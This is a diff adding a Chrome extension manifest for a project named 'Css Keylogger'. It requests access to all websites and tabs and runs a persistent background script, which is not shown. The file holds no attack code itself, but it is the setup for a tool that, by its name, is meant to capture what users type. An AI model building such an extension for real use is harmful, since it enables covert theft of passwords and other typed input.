@@ -1,0 +1,14 @@
+{
+  "name": "Css Keylogger",
+  "version": "0.0.1",
+  "manifest_version": 2,
+  "description": "Css Keylogger",
+  "background": {
+    "scripts": ["background.js"],
+    "persistent": true
+  },
+  "browser_action": {
+    "default_title": "Css Keylogger"
+  },
+  "permissions": ["https://*/*", "http://*/*", "tabs"]
+}
